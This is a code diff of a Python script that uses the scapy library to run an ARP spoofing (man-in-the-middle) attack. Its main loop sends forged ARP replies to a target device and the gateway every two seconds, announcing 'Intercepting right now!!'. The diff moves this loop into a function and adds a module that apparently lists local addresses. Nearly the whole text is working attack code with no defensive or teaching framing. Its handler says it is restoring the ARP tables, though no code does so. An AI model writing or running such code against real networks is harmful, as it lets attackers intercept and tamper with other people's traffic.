@@ -1,5 +1,6 @@
 import scapy.all as scapy
 import time
+import Local_address
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -14,16 +15,23 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 # Example usage:
-target_ip = "192.168.0.3"  # IP of the target device
-spoof_ip = "192.168.0.1"    # IP of the router (gateway)
+target_ip = "192.168.1.2"  # IP of the target device
+spoof_ip = "192.168.1.1"    # IP of the router (gateway)
 
-try:
-    while True:
-        spoof(target_ip, spoof_ip)
-        spoof(spoof_ip, target_ip)
-        time.sleep(2)  # Delay between spoofing packets
+def ARP_spoofing():
+    try:
 
-except KeyboardInterrupt:
-    print("\nARP spoofing stopped. Restoring ARP tables...")
-    # Reset ARP tables here (not shown in the example)
+        print("Intercepting right now!!")
+        while True:
+            spoof(target_ip, spoof_ip)
+            spoof(spoof_ip, target_ip)
+            time.sleep(2)  # Delay between spoofing packets
+
+    except KeyboardInterrupt:
+        print("\nARP spoofing stopped. Restoring ARP tables...")
+
+
+if __name__ == '__main__':
+    ip_list=Local_address.info()
+
 
